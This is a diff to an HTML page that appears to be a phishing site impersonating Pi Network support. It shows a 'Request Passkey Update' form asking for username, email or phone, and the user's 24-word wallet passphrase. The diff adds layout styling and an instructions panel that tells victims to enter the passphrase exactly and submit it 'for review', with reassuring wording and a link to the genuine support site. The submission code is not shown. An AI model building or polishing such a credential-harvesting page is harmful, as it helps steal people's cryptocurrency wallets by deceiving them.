@@ -20,15 +20,30 @@
             font-size: 20px;
             font-weight: bold;
         }
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 40px;
+            gap: 20px;
+        }
         .container {
-            width: 50%;
-            margin: 40px auto;
+            width: 40%;
+            max-width: 400px;
             background: white;
             padding: 25px;
             border-radius: 8px;
             box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
         }
-        .container h2 {
+        .instructions {
+            width: 40%;
+            max-width: 400px;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .container h2, .instructions h2 {
             text-align: center;
             color: #6A329F;
         }
@@ -77,7 +92,11 @@
             text-decoration: none;
         }
         @media (max-width: 768px) {
-            .container {
+            .main-container {
+                flex-direction: column;
+                align-items: center;
+            }
+            .container, .instructions {
                 width: 90%;
             }
         }
@@ -100,17 +119,30 @@
 </head>
 <body>
     <div class="header">Welcome to Pi Network Support</div>
-    <div class="container">
-        <h2>Request Passkey Update</h2>
-        <input type="text" placeholder="Enter Username">
-        <input type="text" placeholder="Enter Email or Phone Number">
-        <textarea id="passphrase" placeholder="Enter your 24-word passphrase"></textarea>
-        <p id="message" class="message"></p>
-        <button class="btn" onclick="validatePassphrase()">Submit Request</button>
-        <p class="info">
-            Your wallet passphrase is only accessible to you. Recovery is impossible.
-            <a href="https://minepi.com/support/" target="_blank">Learn more</a>.
-        </p>
+    <div class="main-container">
+        <div class="container">
+            <h2>Request Passkey Update</h2>
+            <input type="text" placeholder="Enter Username">
+            <input type="text" placeholder="Enter Email or Phone Number">
+            <textarea id="passphrase" placeholder="Enter your 24-word passphrase"></textarea>
+            <p id="message" class="message"></p>
+            <button class="btn" onclick="validatePassphrase()">Submit Request</button>
+            <p class="info"> 
+                As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
+                Recovery of passphrase is currently impossible. 
+                <a href="https://minepi.com/support/" target="_blank" style="color: #6A329F; text-decoration: none; font-weight: bold;">
+                    For more info, click here.
+                </a>
+            </p>
+        </div>
+        <div class="instructions">
+            <h2>Instructions</h2>
+            <p>1. Enter your <strong>username</strong> as registered on Pi Network.</p>
+            <p>2. Provide your <strong>email or phone number</strong> associated with your Pi Wallet.</p>
+            <p>3. Enter your <strong>24-word passphrase</strong> exactly as given during wallet creation.</p>
+            <p>4. Click "Submit Request" to send your request for review.</p>
+            <p>⚠️ <strong>Important:</strong> Pi Network <strong>does not store</strong> your passphrase. Ensure you have entered it correctly.</p>
+        </div>
     </div>
 </body>
 </html>
